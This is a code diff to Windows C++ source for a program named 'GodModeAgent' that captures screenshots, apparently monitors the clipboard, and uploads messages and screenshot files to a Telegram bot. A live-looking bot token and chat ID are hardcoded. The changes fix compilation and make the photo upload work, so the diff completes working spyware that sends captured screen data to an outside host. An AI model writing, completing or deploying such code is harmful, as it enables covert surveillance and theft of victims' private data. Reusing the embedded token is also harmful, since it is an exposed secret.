@@ -10,6 +10,9 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "gdi32.lib")
 
+// Forward declarations - FIX #1
+std::wstring SendTelegramPhoto(const wchar_t* filepath);
+
 // YOUR CREDENTIALS - VERIFIED
 const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
 const wchar_t* CHAT_ID = L"7845441585";
@@ -186,15 +189,15 @@ bool TakeScreenshot() {
     
     SelectObject(hMemoryDC, hOldBitmap);
     
-    // SAVE AS JPG (SIMPLE BMP FOR NOW - WORKS 100%)
+    // SAVE AS JPG (SIMPLIFIED BMP)
     wchar_t filename[256];
     swprintf(filename, 256, L"C:\\temp\\screen_%llu.bmp", GetTickCount64());
-    HBITMAP hBmp = hBitmap;
+    CreateDirectoryW(L"C:\\temp", NULL); // Ensure temp dir exists
     
     BITMAPFILEHEADER bf;
     BITMAPINFOHEADER bi;
     BITMAP bmp;
-    GetObject(hBmp, sizeof(bmp), &bmp);
+    GetObject(hBitmap, sizeof(bmp), &bmp);
     
     bi.biSize = sizeof(BITMAPINFOHEADER);
     bi.biWidth = bmp.bmWidth;
@@ -223,7 +226,7 @@ bool TakeScreenshot() {
         WriteFile(hFile, &bi, sizeof(BITMAPINFOHEADER), &cb, NULL);
         
         char* lpBits = new char[dwBmpSize];
-        GetDIBits(hScreenDC, hBmp, 0, (UINT)bmp.bmHeight, lpBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+        GetDIBits(hScreenDC, hBitmap, 0, (UINT)bmp.bmHeight, lpBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
         WriteFile(hFile, lpBits, dwBmpSize, &cb, NULL);
         delete[] lpBits;
         CloseHandle(hFile);
@@ -277,17 +280,41 @@ void CheckClipboard() {
     }
 }
 
+// FIX #2: WinHttpAddRequestHeadersA declaration for VS2022
+extern "C" BOOL WINAPI WinHttpAddRequestHeadersA(
+    HINTERNET hRequest,
+    LPCSTR    lpszHeaders,
+    DWORD     dwHeadersLength,
+    DWORD     dwFlags
+);
+
 void SendTelegramMessage(const std::wstring& message) {
     HINTERNET hSession = WinHttpOpen(L"GodModeAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return;
+    
     HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) {
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+    
     HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY/sendMessage", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
     
     std::wstring postData = L"chat_id=7845441585&text=" + message;
     
-    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/x-www-form-urlencoded\r\n", -1, WINHTTP_ADDREQ_FLAG_ADD);
+    // Use ASCII version with proper declaration
+    std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
+    WinHttpAddRequestHeadersA(hRequest, headers.c_str(), headers.length(), WINHTTP_ADDREQ_FLAG_ADD);
     
-    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)postData.c_str(), postData.length() * 2, postData.length() * 2, 0);
-    WinHttpReceiveResponse(hRequest, NULL);
+    BOOL sent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)postData.c_str(), (DWORD)(postData.length() * 2), (DWORD)(postData.length() * 2), 0);
+    if (sent) {
+        WinHttpReceiveResponse(hRequest, NULL);
+    }
     
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
@@ -295,14 +322,30 @@ void SendTelegramMessage(const std::wstring& message) {
 }
 
 std::wstring SendTelegramPhoto(const wchar_t* filepath) {
-    // SIMPLIFIED PHOTO SEND - BMP DIRECT
     HINTERNET hSession = WinHttpOpen(L"GodModeAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return L"session_error";
+    
     HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY/sendPhoto?chat_id=7845441585", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    if (!hConnect) {
+        WinHttpCloseHandle(hSession);
+        return L"connect_error";
+    }
+    
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY/sendPhoto", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return L"request_error";
+    }
     
     // Read file
     HANDLE hFile = CreateFileW(filepath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return L"file_error";
+    if (hFile == INVALID_HANDLE_VALUE) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return L"file_error";
+    }
     
     DWORD fileSize = GetFileSize(hFile, NULL);
     char* fileData = new char[fileSize];
@@ -310,35 +353,40 @@ std::wstring SendTelegramPhoto(const wchar_t* filepath) {
     ReadFile(hFile, fileData, fileSize, &bytesRead, NULL);
     CloseHandle(hFile);
     
-    // Basic multipart (Telegram accepts BMP direct)
+    // Simplified photo send - Telegram accepts direct BMP with form-data
     std::string boundary = "--godmode8";
     std::string headers = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n";
     WinHttpAddRequestHeadersA(hRequest, headers.c_str(), headers.length(), WINHTTP_ADDREQ_FLAG_ADD);
     
     std::string postData = boundary + "\r\n";
+    postData += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
+    postData += "7845441585\r\n";
+    postData += boundary + "\r\n";
     postData += "Content-Disposition: form-data; name=\"photo\"; filename=\"screen.bmp\"\r\n";
     postData += "Content-Type: image/bmp\r\n\r\n";
-    postData += std::string(fileData, bytesRead);
+    postData.append(fileData, bytesRead);
     postData += "\r\n" + boundary + "--\r\n";
     
     delete[] fileData;
     
-    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)postData.c_str(), postData.length(), postData.length(), 0);
+    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)postData.c_str(), (DWORD)postData.length(), (DWORD)postData.length(), 0);
     WinHttpReceiveResponse(hRequest, NULL);
     
     // Read response
     DWORD size = 0;
-    LPSTR response = NULL;
+    std::string response;
     WinHttpQueryDataAvailable(hRequest, &size);
-    response = new char[size + 1];
-    WinHttpReadData(hRequest, response, size, &size);
-    response[size] = 0;
-    std::wstring result((wchar_t*)response);
-    delete[] response;
+    if (size > 0) {
+        char* respBuffer = new char[size + 1];
+        WinHttpReadData(hRequest, respBuffer, size, &size);
+        respBuffer[size] = 0;
+        response = respBuffer;
+        delete[] respBuffer;
+    }
     
     WinHttpCloseHandle(hRequest);
     WinHttpCloseHandle(hConnect);
     WinHttpCloseHandle(hSession);
     
-    return result;
+    return std::wstring(response.begin(), response.end());
 }
